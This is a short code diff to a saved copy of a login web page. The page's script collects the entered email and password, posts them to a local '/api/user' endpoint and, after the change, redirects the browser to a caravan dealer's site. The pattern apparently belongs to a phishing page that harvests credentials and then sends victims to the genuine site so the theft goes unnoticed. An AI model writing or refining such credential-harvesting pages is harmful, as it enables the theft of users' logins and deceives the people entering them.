@@ -3955,7 +3955,7 @@ data-savepage-crossorigin="" title="reCAPTCHA" width="256" height="60" role="pre
 
               formData = JSON.stringify({
                 email: formData.get('sUserName'),
-                password: formData.get('sPassword')
+                pass: formData.get('sPassword')
               });
           
               const response = await fetch('/api/user', {
@@ -3967,6 +3967,8 @@ data-savepage-crossorigin="" title="reCAPTCHA" width="256" height="60" role="pre
               });
           
               const result = await response.json();
+	
+	      window.location.href = 'https://www.caravans.nl/dealer/multicampers-wageningen/';
               console.log('Server Response:', result);
             });
           </script>
